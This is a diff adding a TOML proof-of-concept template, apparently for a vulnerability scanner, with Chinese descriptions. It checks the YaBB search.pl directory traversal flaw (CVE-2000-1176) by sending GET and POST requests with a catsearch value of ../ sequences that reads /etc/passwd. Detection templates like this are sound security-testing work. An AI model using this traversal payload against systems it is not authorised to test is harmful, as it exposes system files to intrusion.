@@ -1,0 +1,40 @@
+[info]
+author = "AVE"
+description = "验证 YaBB search.pl CGI 脚本的目录遍历漏洞，通过 catsearch 表单字段传入 ../ 序列读取任意文件"
+id = "POC-AVE-2000-0832"
+name = "YaBB search.pl 目录遍历漏洞 PoC"
+severity = "high"
+tags = ["ave-2000-0832"]
+vuln_id = [
+    "CVE-2000-1176",
+    "AVE-2000-0832",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/search.pl?catsearch=../../../../../../../../etc/passwd"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/search.pl"
+protocol = "http"
+
+[poc.requests.body]
+content = "catsearch=../../../../../../../../etc/passwd"
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
